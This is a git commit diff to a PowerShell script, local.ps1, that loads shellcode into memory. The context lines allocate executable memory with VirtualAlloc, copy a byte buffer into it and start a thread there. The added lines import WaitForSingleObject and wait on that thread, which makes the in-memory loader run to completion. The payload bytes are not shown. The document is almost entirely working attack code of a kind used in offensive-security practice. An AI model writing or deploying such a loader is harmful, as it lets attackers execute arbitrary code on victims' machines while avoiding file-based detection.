6de58f23e7e892dad4eb99ce53f7c6313a3ef5b7
Matthew Herrada <72326072+MattXHero11X@users.noreply.github.com>
2021-04-28 01:48:00 -0500

    Update local.ps1

--- local.ps1
+++ local.ps1
@@ -6,6 +6,8 @@ public class Kernel32 {
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+   [DllImport("kernel32.dll", SetLastError=true)]
+   public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 }
 "@
 Add-Type $Kernel32
@@ -14,3 +16,4 @@ $size = $buf.Length
 [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
